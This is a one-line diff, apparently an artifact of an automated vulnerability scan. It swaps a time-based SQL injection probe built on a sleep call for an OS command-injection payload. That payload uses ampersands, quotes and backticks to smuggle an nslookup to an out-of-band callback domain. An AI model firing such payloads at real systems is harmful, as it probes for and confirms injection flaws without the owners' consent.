@@ -1,1 +1,1 @@
-555'||sleep(27*1000)*amkszl||'
+&nslookup -q=cname hitkbdaqodjepc9177.bxss.me&'\"`0&nslookup -q=cname hitkbdaqodjepc9177.bxss.me&`'
